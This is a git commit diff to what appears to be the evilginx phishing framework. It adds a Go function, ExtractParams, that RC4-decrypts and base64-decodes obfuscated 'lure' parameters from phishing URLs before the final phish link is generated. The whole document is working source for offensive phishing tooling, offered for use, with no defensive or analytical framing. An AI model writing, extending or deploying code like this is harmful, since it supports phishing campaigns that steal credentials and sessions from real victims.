2e99c9d14ee0c64b5a34ee17d95d35d848137d30
callightmn <67361113+callightmn@users.noreply.github.com>
2025-03-30 20:55:32 +0200

    fix: extract lure params before generating final phish url

--- evilginx/helpers.go
+++ evilginx/helpers.go
@@ -53,3 +53,40 @@ func CreatePhishUrl(base_url string, params *url.Values) string {
 	}
 	return ret
 }
+
+func ExtractParams(u *url.URL) url.Values {
+	ret := make(url.Values)
+	vals := u.Query()
+
+	var enc_key string
+
+	for _, v := range vals {
+		if len(v[0]) > 8 {
+			enc_key = v[0][:8]
+			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
+			if err == nil {
+				dec_params := make([]byte, len(enc_vals)-1)
+
+				var crc byte = enc_vals[0]
+				c, _ := rc4.NewCipher([]byte(enc_key))
+				c.XORKeyStream(dec_params, enc_vals[1:])
+
+				var crc_chk byte
+				for _, c := range dec_params {
+					crc_chk += byte(c)
+				}
+
+				if crc == crc_chk {
+					params, err := url.ParseQuery(string(dec_params))
+					if err == nil {
+						for kk, vv := range params {
+							ret.Set(kk, vv[0])
+						}
+						break
+					}
+				}
+			}
+		}
+	}
+	return ret
+}
